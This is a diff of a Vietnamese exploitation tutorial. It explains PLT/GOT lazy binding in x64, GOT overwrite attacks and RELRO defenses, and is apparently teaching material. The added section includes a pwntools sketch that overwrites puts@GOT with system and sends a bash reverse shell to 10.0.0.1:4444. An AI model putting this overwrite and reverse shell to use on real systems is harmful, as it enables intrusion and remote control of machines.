@@ -163,19 +163,155 @@ Lệnh **`ret`** ở cuối mỗi hàm thực chất là lệnh lấy giá trị
 
 Nếu Stack bị bảo vệ quá nghiêm ngặt (Canary không thể leak), mục tiêu tối thượng chuyển sang **Bảng GOT (Global Offset Table)**.
 
-### 5.1. Liên Kết Động (Lazy Binding) & Bảng GOT
-Hầu hết chương trình mượn hàm `puts`, `read` từ thư viện `libc.so`. Khi có ASLR, chương trình không biết địa chỉ hàm nằm ở đâu.
-* Khi gọi `puts` lần đầu, luồng lệnh nhảy vào bảng **PLT**, sau đó mượn Dynamic Linker tính toán địa chỉ thật của `puts` trong `libc`, rồi **ghi đè địa chỉ đó vào bảng GOT**.
-* Lần gọi sau, chương trình đọc trực tiếp địa chỉ xịn từ GOT.
+---
 
-### 5.2. Vấn Đề Chết Người: GOT Overwrite
-Vì Dynamic Linker phải ghi vào GOT trong lúc chạy, **vùng nhớ chứa GOT bắt buộc phải có quyền Đọc & Ghi (Read/Write)**.
-Nếu ta có lỗ hổng **Arbitrary Write** (Ghi một giá trị tại địa chỉ tùy ý, VD: Format String `%n`, OOB Write, UAF), ta không cần đánh Stack. Ta chỉ cần ghi địa chỉ hàm `system("/bin/sh")` đè lên địa chỉ `puts@got.plt`.
-Khi chương trình ngây thơ gọi `puts("Hello")`, thanh ghi `RIP` sẽ nhảy thẳng vào `system("Hello")`. Game Over.
+### 1. TẠI SAO LẠI CẦN PLT VÀ GOT? (Sự ra đời của vấn đề)
 
-### 5.3. Phòng thủ bằng RELRO (Relocation Read-Only)
+Nói ngắn gọn: **Để tiết kiệm tài nguyên và thích ứng với ASLR.**
+
+Nếu bạn biên dịch tĩnh (Static Linking), toàn bộ code của hàm `puts`, `printf` từ thư viện `libc` sẽ bị nhồi thẳng vào file thực thi của bạn. File sẽ phình to lên hàng Megabytes. 
+Thay vào đó, Linux dùng **Liên kết động (Dynamic Linking)**. Các chương trình chỉ chứa một "lời hứa" rằng nó sẽ dùng hàm `puts`. Khi chạy, hệ điều hành sẽ load một bản copy duy nhất của thư viện `libc.so` vào RAM và cho tất cả các phần mềm dùng chung.
+
+**Nhưng rắc rối là:** Do cơ chế bảo vệ ASLR (Address Space Layout Randomization), địa chỉ của thư viện `libc` trong RAM sẽ bị đổi chỗ ngẫu nhiên mỗi lần chương trình khởi động. Tại thời điểm biên dịch mã nguồn, file thực thi **không thể biết** hàm `puts` sẽ nằm ở đâu trong bộ nhớ.
+
+Để giải bài toán "gọi một hàm mà không biết địa chỉ của nó", hệ điều hành sinh ra cặp bài trùng: **Bảng PLT** và **Bảng GOT**.
+
+---
+
+### 2. GIẢI PHẪU CẤU TRÚC: CHÚNG LÀ GÌ VÀ TRÔNG NHƯ THẾ NÀO?
+
+Trong không gian bộ nhớ của một tiến trình (Process Memory), hệ thống dành ra các phân vùng (sections) đặc biệt cho tác vụ này.
+
+### A. Bảng PLT (Procedure Linkage Table)
+*   **Bản chất:** Là một phân vùng chứa **Mã lệnh (Code)**. Nó nằm trong vùng nhớ `.plt` và có quyền **Thực thi (Executable)**.
+*   **Chức năng:** Đóng vai trò là các "Trampoline" (Bàn đạp). File thực thi sẽ không gọi thẳng vào `libc`, mà gọi vào các đoạn code nhỏ trong PLT.
+*   **Nó trông như thế nào?** Nó là một mảng các đoạn Assembly ngắn, mỗi đoạn tương ứng với một hàm (ví dụ: `puts@plt`, `printf@plt`).
+
+### B. Bảng GOT (Global Offset Table)
+*   **Bản chất:** Là một phân vùng chứa **Dữ liệu (Data)**. Nó là một mảng các con trỏ (Pointers) 8-byte trên x64.
+*   **Phân loại nhỏ (Rất quan trọng trong 0-day):**
+    *   `.got`: Chứa địa chỉ của các biến toàn cục (Global Variables).
+    *   `.got.plt`: Chứa địa chỉ thực của các **Hàm** ngoại lai (Function Pointers). *(Trong giới Pwn, khi nói GOT Overwrite, 99% ta đang nói đến `.got.plt`)*.
+*   **Quyền truy cập:** Vì địa chỉ thực chỉ được biết *sau khi* chương trình đã chạy, vùng nhớ `.got.plt` này **bắt buộc phải có quyền Ghi (Writable)** mặc định.
+
+---
+
+### 3. CƠ CHẾ LAZY BINDING: ĐIỆU NHẢY CỦA POINTERS (Phân tích Assembly x64)
+
+Để tối ưu tốc độ khởi động, Linux áp dụng **Lazy Binding (Liên kết trễ)**: Hệ thống sẽ *không* đi tìm địa chỉ của toàn bộ hàng ngàn hàm trong `libc` ngay từ đầu. Hàm nào được gọi thì mới đi tìm hàm đó.
+
+Hãy soi mã máy x64 khi chương trình của bạn gọi `puts("hello hackers");`. Dưới đây là 3 trạng thái cần chú ý:
+
+#### Trạng thái 1: Lần gọi đầu tiên (Pre-Resolution)
+Khi `main` gọi `puts`, lệnh Assembly thực tế là `call puts@plt`.
+
+<img width="1204" height="629" alt="image" src="https://github.com/user-attachments/assets/bbd760ed-45e2-4b3c-bd2c-afdffa765ff8" />
+
+
+```assembly
+; Bên trong vùng nhớ .plt (Quyền: Thực thi)
+0x555555555030 <puts@plt>:
+  jmp QWORD PTR[rip+0x2fca]  ; 1. Đọc một địa chỉ từ bảng GOT và nhảy đến đó
+  push 0x0                    ; 2. Đẩy "ID" (reloc_index) của hàm puts lên Stack
+  jmp 0x555555555020          ; 3. Nhảy đến PLT[0] (Khu vực của Phù thủy)
+```
+
+<details>
+    <summary>Giải thích vài điều</summary>
+
+---
+
+* Trong file ELF hiện đại, có hai phân đoạn: .got (dành cho biến toàn cục) và .got.plt (dành cho địa chỉ hàm). Khi nói về PLT, chúng ta đang nói đến .got.plt.
+<img width="869" height="654" alt="image" src="https://github.com/user-attachments/assets/b9293c5a-fc17-4946-9d7e-0bcbec104a4e" />
+
+* Compiler và Linker khi tạo ra file thực thi đã tính toán trước khoảng cách (**offset**) cố định giữa phân đoạn mã lệnh (`.plt`) và phân đoạn dữ liệu (`.got.plt`). Lệnh `jmp [rip + offset]` là một lệnh "Indirect Jump" dùng để nhảy tới địa chỉ trong phân đoạn `.got.plt` mà `rip+offset` trỏ tới.
+
+* File thực thi của bạn có một danh sách các hàm cần tìm địa chỉ (như `puts`, `printf`, `scanf`). Danh sách này nằm trong một bảng gọi là Relocation Table (cụ thể là `.rela.plt`). Vậy, `reloc_index` chính là số thứ tự (hoặc offset) của dòng đó trong bảng Relocation.
+
+---
+    
+</details>
+
+Ở dòng (1), CPU nhìn vào vùng `.got.plt` để xem hàm `puts` nằm ở đâu.
+Nhưng vì đây là lần gọi đầu tiên, bảng GOT chưa chứa địa chỉ thật. Trình biên dịch đã cố tình gài sẵn vào GOT một địa chỉ "ảo", trỏ **ngược lại** chính dòng lệnh (2) bên trong PLT.
+
+```assembly
+; Bên trong vùng nhớ .got.plt (Quyền: Đọc/Ghi)
+0x555555558018 <puts@got.plt>: 0x555555555036  (Chính là địa chỉ của lệnh push 0x0)
+```
+
+Kết quả: Luồng thực thi bị dội ngược lại, thực hiện lệnh `push 0x0` (lưu ID của hàm `puts` để hệ thống biết đang cần tìm hàm nào), rồi nhảy thẳng vào `PLT[0]`.
+
+<img width="1239" height="664" alt="image" src="https://github.com/user-attachments/assets/1f34a71b-e1e4-4d43-8f8c-6d6b1fc0d7d5" />
+
+
+#### Trạng thái 2: "Phù thủy" giải quyết (The Resolver)
+`PLT[0]` chứa một đoạn code đặc biệt gọi vào hàm `_dl_runtime_resolve` của hệ điều hành (Dynamic Linker). 
+"Phù thủy" này sẽ thực hiện các việc sau:
+1. Dựa vào `ID = 0x0` trên Stack, nó tra cứu bảng Symbol để biết phần mềm đang đòi hàm `puts`.
+2. Nó lùng sục trong không gian bộ nhớ của `libc.so` xem `puts` đang nằm ở địa chỉ vật lý nào.
+3. **[HÀNH ĐỘNG CỐT LÕI]:** Nó lấy địa chỉ thật (ví dụ: `0x7ffff7a91da0`) và **ghi đè** vào ô `puts@got.plt`.
+4. Nhảy đến hàm `puts` thật và in ra chữ "Hello".
+
+#### Trạng thái 3: Các lần gọi sau (Post-Resolution)
+Những lần tiếp theo chương trình gọi `puts("Hi");`, CPU lại chui vào `puts@plt` và chạy lệnh dòng (1):
+
+```assembly
+0x555555555030 <puts@plt>:
+  jmp QWORD PTR [rip+0x2fca]  ; Đọc địa chỉ từ GOT
+```
+Lúc này, ô nhớ trong GOT đã chứa địa chỉ thật:
+```assembly
+0x555555558018 <puts@got.plt>: 0x00007ffff7a91da0  (Địa chỉ trong libc.so)
+```
+CPU nhảy một phát sang `libc` luôn, vô cùng trơn tru, không cần đi qua "Phù thủy" nữa.
+
+<img: ảnh minh họa trạng thái Post-Resolution: Lệnh jmp trong PLT trỏ vào bảng GOT, bảng GOT giờ đây trỏ thẳng một đường mũi tên dài sang vùng nhớ của thư viện Libc>
+
+---
+
+### 4. CƠ CHẾ LỢI DỤNG: GOT OVERWRITE (Chiếm quyền điều khiển)
+
+#### Bản chất của lỗ hổng
+Kiến trúc Lazy Binding phơi bày một điểm yếu chí mạng: Bảng `.got.plt` chứa các **con trỏ hàm (Function Pointers)** quyết định luồng thực thi, nhưng lại nằm trong vùng nhớ **có quyền Ghi (Writable)** ở địa chỉ cố định (nếu không có PIE) hoặc địa chỉ tính toán được bằng Offset.
+
+Chỉ cần kẻ tấn công sở hữu một **Arbitrary Write Primitive** (Lỗi ghi bộ nhớ tùy ý tại một địa chỉ bất kỳ, thường sinh ra từ Format String `%n`, OOB Write tĩnh, hoặc Use-After-Free), chúng sẽ biến GOT thành bàn đạp để Hijack luồng điều khiển.
+
+#### Kịch bản khai thác kinh điển:
+Kẻ tấn công nhận thấy chương trình có gọi hàm `exit()` ở cuối cùng.
+1. **Dùng Arbitrary Write:** Kẻ tấn công ghi đè giá trị tại địa chỉ `exit@got.plt`.
+2. **Nội dung ghi đè:** Thay vì để nó chứa địa chỉ của hàm `exit` (hoặc địa chỉ trỏ về PLT), kẻ tấn công ghi đè bằng địa chỉ của hàm **`system`** (hoặc địa chỉ của một đoạn ROP chain/Shellcode).
+3. **Triggers (Kích hoạt):** Khi chương trình chạy đến cuối và gọi lệnh `exit()`, CPU làm đúng bổn phận: Nó tra cứu `exit@got.plt`, thấy địa chỉ của `system`, và nhảy thẳng vào `system`. 
+4. Nếu kẻ tấn công khéo léo chuẩn bị sẵn thanh ghi `RDI` trỏ vào chuỗi `"/bin/sh"`, hàm `system("/bin/sh")` sẽ được gọi thay vì `exit()`.
+
+### Minh họa Exploit giả mã (Python / Pwntools)
+```python
+from pwn import *
+
+elf = ELF('./target_binary')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+# 1. Thu thập địa chỉ
+got_puts_addr = elf.got['puts']  # Địa chỉ của ô puts@got.plt
+system_addr = libc.symbols['system'] # Địa chỉ thật của system (Đã leak base trước đó)
+
+# 2. Xây dựng Arbitrary Write
+# Giả sử chúng ta có hàm write_memory(địa_chỉ, dữ_liệu) thông qua lỗi OOB Write
+log.info(f"Overwriting puts@GOT ({hex(got_puts_addr)}) with system ({hex(system_addr)})")
+
+write_memory(address=got_puts_addr, data=system_addr)
+
+# 3. Kích hoạt (Trigger)
+# Lần tiếp theo chương trình gọi puts("chuỗi của bạn"), 
+# nó sẽ thực thi system("chuỗi của bạn")
+send_payload("bash -c 'sh -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
+```
+
+--- 
+*Đây là toàn bộ giải phẫu học của GOT. Bạn có thể sử dụng các thẻ `<img: ...>` để bổ sung hình ảnh sơ đồ vào đúng các vị trí đã đánh dấu để tạo ra một bản tài liệu hoàn hảo về mặt thị giác.*
+### 5. Phòng thủ bằng RELRO (Relocation Read-Only)
 * **Partial RELRO:** Bảng `.got.plt` vẫn cho phép ghi. KHÔNG cản được GOT Overwrite.
-* **Full RELRO:** Khi chương trình khởi động, Loader sẽ phân giải sẵn TẤT CẢ các hàm, điền vào GOT, rồi dùng syscall `mprotect` khóa cứng vùng nhớ GOT thành **Chỉ Đọc (Read-Only)**. GOT Overwrite chết đứng. Hacker lúc này phải nhắm vào các mục tiêu khó hơn như `__free_hook`, `__malloc_hook` của libc.
+* **Full RELRO:** Khi chương trình khởi động, Loader sẽ phân giải sẵn TẤT CẢ các hàm, điền vào GOT, rồi dùng syscall `mprotect` khóa cứng vùng nhớ GOT thành **Chỉ Đọc (Read-Only)**. GOT Overwrite chết đứng. Hacker lúc này phải nhắm vào các mục tiêu khó hơn như `__free_hook`, `__malloc_hook` của libc, cấu trúc luồng của tcache, hoặc vtable của C++ Heap Objects.
 
 ---
 
